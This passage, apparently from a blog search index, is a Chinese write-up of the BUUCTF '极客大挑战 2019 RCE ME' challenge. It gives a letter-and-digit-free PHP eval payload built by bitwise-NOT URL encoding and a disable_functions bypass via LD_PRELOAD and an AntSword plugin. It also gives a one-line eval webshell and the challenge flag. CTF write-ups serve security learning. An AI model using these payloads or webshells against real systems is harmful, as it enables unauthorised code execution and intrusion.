die(\"This is too Long.\"); } if(preg_match(\"/[A-Za-z0-9]+/\",$code)){ die(\"NO.\"); } @eval($code); } else{ highlight_file(__FILE__); } // ?\u003e 分析一波，GET请求获得code，想要通过的话需要绕过两个检测： payload长度小于40 不能包含a-z、A-Z、0-9 和之前做过DMCTF里的一个不能用数字和字母构造payload一样，当时参考的博客是phith0n师傅的:一些不包含数字和字母的webshell，这次摸到了相关文章：无字母数字webshell之提高篇。 使用url编码+~取反构造不可见字符串，然后加上php7版本以后支持了使用：($a)()这样的方法动态执行函数，所以我们可以构造payload：assert(eval($_POST[‘a’])) 先构造assert： echo urlencode(~'assert'); //结果：%9E%8C%8C%9A%8D%8B 再构造eval($_POST['a'])： echo urlencode(~'eval($_POST[\\'a\\'])'); //结果：%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%D8%9E%D8%A2%D6 完整payload： ?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%D8%9E%D8%A2%D6); 网站获得请求以后会进行url解码，由于是不可见字符可以绕过长度和正则表达式，之后执行代码时，前面的~取反再获得真正的函数名。 使用蚁剑连接，进后台在根目录找到了flag、readflag。打开flag内容为空，又打开readflag文件是一堆乱码，但是看到了文件头是ELF是linux的可执行文件。那么很有可能就是执行readflag才能获得flag，但是在终端执行时出现了一些问题：无论输入什么，终端都只会返回ret=127： 搜索了一波，原来是是disable_function搞的鬼，这个表可以在phpinfo()中查看： 因为system、exec、shell_exec等命令执行的函数都被禁止了，目前我理解的webshell就是通过这些函数才能在终端执行命令的，所以终端基本是个废的，所以就是寻找绕过disable_function的方法，网上有很多其他方法，其中一个方法： 利用环境变量LD_PRELOAD来绕过 php的mail函数在执行过程中会默认调用系统程序/usr/sbin/sendmail，如果我们能劫持sendmail程序，再用mail函数来触发就能实现我们的目的 LD_PRELOAD是Linux系统的下一个有趣的环境变量：“它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。 正好蚁剑的插件中就有一个名为：as_bypass_php_disable_functions的插件，可以选择在插件市场安装或是手动安装（github有步骤）。安装以后右键shell选择加载插件： 插件的工作原理是自动上传几个绕过的文件，然后再用蚁剑连接上传的文件即可实现绕过，但是一开始的/var/www/html目录是没有上传权限的，我右键以后发现能修改权限，改成0777： 在这里我还遇到了问题，使用原来的shell执行插件功能以后，终端还是没有权限，但是我尝试了自己又上传了一个一句话木马，用这个新的一句话木马执行插件才成功，具体原因我也不清楚，如果有师傅知道原因求告知。 上传一句话木马233.php： \u003c?php @eval($_POST['b']); 再用一句话木马的shell执行插件： 进入shell，目录下面多了一个名为**.antproxy.php**的文件： 再使用蚁剑连接**.antproxy.php**，密码是运行插件的那个shell的密码，这时候就可以开开心心的去根目录下执行readflag获得flag辣。 flag{a216900e-2427-48f7-9323-f65d0a3abdbf} ","date":"0001-01-01","objectID":"/posts/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019rce-me/:0:0","series":null,"tags":["Web","BUUCTF_Web","RCE","disable_function绕过"],"title":"极客大挑战 2019 RCE ME","uri":"/posts/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019rce-me/#极客大挑战-2019rce-me"}]